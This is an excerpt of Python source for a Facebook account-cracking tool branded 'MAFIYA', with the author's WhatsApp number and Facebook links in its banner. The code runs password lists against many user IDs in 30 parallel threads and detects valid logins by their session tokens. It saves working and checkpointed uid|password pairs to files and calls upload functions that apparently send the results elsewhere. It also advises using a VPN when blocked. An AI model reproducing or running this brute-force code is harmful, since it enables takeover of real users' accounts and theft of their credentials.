...
def helpnote():
	...
	exit(" [*] FACEBOOK : https://www.facebook.com/profile.php?id=100082543587085")
...
class Main:
	def __init__(self):
		...
		print ("""      ######## \033[1;97m##     ## \033[1;92m########
         ...
         ##    \033[1;97m##     ## \033[1;92m##
         ##    \033[1;97m##     ## \033[1;92m########
 \033[1;97m __  __          ______ _______     __
                      |  \/  |   /\   |  ____|_   _\ \   / //\
 \033[1;97m | \  / |  / /\\| |__    | |  \ \_/ //  \
 \033[1;97m | |  | | / ___\| |      _| |_   | |/ ____ \
 \033[1;97m|_|  |_/_/    \_\_|   |_____|  |_/_/    \_\
==================================================
           CODED BY :    𝐌𝐀𝐅𝐈𝐘𝐀 𝐊𝐈𝐍𝐆    
           WHATSAPP : +919971945685    
           FB PAGE  : 𝐌𝐀𝐅𝐈𝐘𝐀 𝐏𝐀𝐏𝐀   
==================================================           
\x1b[0;91m\x1b[1;43m                  M9F|¥9 TH3 BR4ND :)                 \x1b[0m""")
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [!] 𝐈𝐅 𝐍𝐎 𝐑𝐄𝐒𝐔𝐋𝐓𝐒 𝐔𝐒𝐄 𝐒𝐌𝐀𝐑𝐓 𝐕𝐏𝐍\x1b[0m\n"%(R))
				for user in self.id:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [M9F|¥9 HUNTER] : %s/%s -> \033[0;92m [ M9F|¥9-OK:%s ]- \033[0;94m[M9F|¥9-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[M9F|¥9-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [M9F|¥9-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;94m[M9F|¥9-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [M9F|¥9-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
